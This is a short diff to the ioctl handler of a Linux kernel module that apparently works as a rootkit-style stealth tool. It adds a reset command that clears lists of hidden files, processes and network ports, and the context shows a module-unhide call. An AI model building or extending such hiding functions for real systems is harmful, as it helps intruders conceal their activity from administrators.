@@ -152,6 +152,16 @@ static long vault_kernel_ioctl(struct file *file, unsigned int cmd,
         stealth_unhide_module();
         break;
 
+    case IOCTL_RESET_ALL:
+        /* Teardown in one shot: forget every hidden file/pid/port.
+         * Does NOT touch the module stealth state — that is handled
+         * by IOCTL_MODULE_UNHIDE. */
+        file_hide_reset();
+        proc_hide_reset();
+        net_hide_reset();
+        pr_info(VAULT_KERNEL_TAG " reset: all hide lists cleared\n");
+        break;
+
     case IOCTL_GET_STATS: {
         char *buf;
         long uptime_s = 0;
